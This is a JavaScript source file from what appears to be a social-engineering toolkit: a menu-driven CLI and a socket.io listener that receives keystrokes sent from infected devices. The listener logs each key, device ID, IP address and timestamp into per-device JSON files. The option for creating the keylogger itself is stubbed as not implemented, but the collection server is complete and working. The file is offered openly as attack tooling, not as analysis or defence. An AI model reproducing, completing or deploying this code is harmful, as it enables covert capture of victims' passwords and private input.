// Keylogger CLI and listener server for SocialEngineering toolkit
// This file is a JavaScript reimplementation of the Python example.

const readline = require('readline');
const chalk = require('chalk');
const fs = require('fs');
const path = require('path');
const ui = require('../includes/banner');

function askQuestion(prompt) {
    return new Promise(resolve => {
        const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
        rl.question(prompt, ans => {
            rl.close();
            resolve(ans.trim());
        });
    });
}

function banner() {
    ui.clearScreen();
    ui.printBanner();
    console.log(chalk.red('⌨️  keylogger')); // simple banner
}

function inputInstructions() {
   console.log(`
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃ ${chalk.red('Instructions')}                                         ┃
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃ ${chalk.white('🖥️  Step : Choose OS type → win, linux, or mac')}       ┃
┃ ${chalk.white("❌ Enter ")}${chalk.red("'x'")}${chalk.white(" to exit anytime")}                         ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
`);
}

async function getOsType() {
    while (true) {
        const os_type = (await askQuestion('1 🖥️  Enter OS type (win/linux/mac): ')).toLowerCase();
        if (os_type === 'x') return 'exit';
        if (['win', 'linux', 'mac'].includes(os_type)) return os_type;
        console.log(chalk.red("❌ Invalid OS type. Please enter 'win', 'linux', or 'mac'."));
    }
}

async function userOption() {
    ui.clearScreen();
    ui.printBanner();
    console.log(`
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃ ${chalk.cyan('Keylogger Options')}                                    ┃
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃ ${chalk.white('1  Create a new keylogger')}                            ┃
┃ ${chalk.white('2  Start listening for an existing keylogger')}         ┃
┃ ${chalk.white("3  Enter ")}${chalk.red("'x'")}${chalk.white(" to exit anytime")}                         ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
`);
    while (true) {
        const opt = (await askQuestion('👉 Enter your option: ')).toLowerCase();
        if (['1','2','x'].includes(opt)) return opt;
        console.log(chalk.red("Invalid option. Please enter 1, 2, or 'x' to exit."));
    }
}

// ---------- server implementation ----------
function ensureKeyloggerDirs() {
    const base = path.join(process.cwd(), 'keylogger');
    const devices = path.join(base, 'devices');
    if (!fs.existsSync(base)) fs.mkdirSync(base);
    if (!fs.existsSync(devices)) fs.mkdirSync(devices, { recursive: true });
    const master = path.join(base, 'keylogger.json');
    if (!fs.existsSync(master)) {
        fs.writeFileSync(master, JSON.stringify({ devices: [], total_connected: 0, last_connected_device: null }, null, 2));
    }
    return { base, devices, master };
}

function loadMaster(masterFile) {
    try {
        const raw = fs.readFileSync(masterFile, 'utf8');
        if (!raw) throw new Error('empty');
        return JSON.parse(raw);
    } catch (e) {
        return { devices: [], total_connected: 0, last_connected_device: null };
    }
}

function saveMaster(masterFile, data) {
    const tmp = masterFile + '.tmp';
    fs.writeFileSync(tmp, JSON.stringify(data, null, 2));
    fs.renameSync(tmp, masterFile);
}

function startKeyloggerServer() {
    const { Server } = require('socket.io');
    const { base, devices, master } = ensureKeyloggerDirs();
    const masterPath = master;
    let clients = {};

    const io = new Server(5000, { cors: { origin: '*' } });

    io.on('connection', socket => {
        const ip = socket.handshake.address;
        clients[socket.id] = { connected_at: new Date(), ip };

        socket.on('disconnect', () => {
            delete clients[socket.id];
        });

        socket.on('keypress', data => {
            const device_id = data.device_id || 'unknown';
            const key = data.key || '?';
            const timestamp = new Date().toISOString();
            const ipAddr = clients[socket.id] && clients[socket.id].ip;

            console.log(chalk.blue('\n⏰ Time:'), timestamp);
            console.log(chalk.green('💻 Device ID:'), device_id);
            console.log(chalk.magenta('🔑 Key Pressed:'), key);
            console.log(chalk.yellow('🌐 IP Address:'), ipAddr);

            // update master
            const m = loadMaster(masterPath);
            if (!m.devices.includes(device_id)) {
                m.devices.push(device_id);
                m.total_connected += 1;
            }
            m.last_connected_device = device_id;
            saveMaster(masterPath, m);

            // append to device file
            const devFile = path.join(devices, `${device_id}.json`);
            let devLogs = [];
            if (fs.existsSync(devFile)) {
                try { devLogs = JSON.parse(fs.readFileSync(devFile, 'utf8')); } catch {};
            }
            devLogs.push({ timestamp, ip: ipAddr, key });
            fs.writeFileSync(devFile, JSON.stringify(devLogs, null, 2));
        });
    });

    console.log(chalk.green('🎧 Keylogger Listener Started')); 
    console.log(chalk.red('❌ Press Ctrl+C to stop the server'));    
}

async function run() {
    banner();
    inputInstructions();
    const osType = await getOsType();
    if (osType === 'exit') return;
    const opt = await userOption();
    if (opt === 'x')  { ui.clearScreen(); ui.printBanner(); return; }
    if (opt === '1') {
        console.log(chalk.yellow('Create mode not implemented in JS version.'));
    } else if (opt === '2') {
        startKeyloggerServer();
        // keep process alive
    }
}

module.exports = { run };

// allow standalone execution
if (require.main === module) {
    (async () => {
        await run();
    })();
}
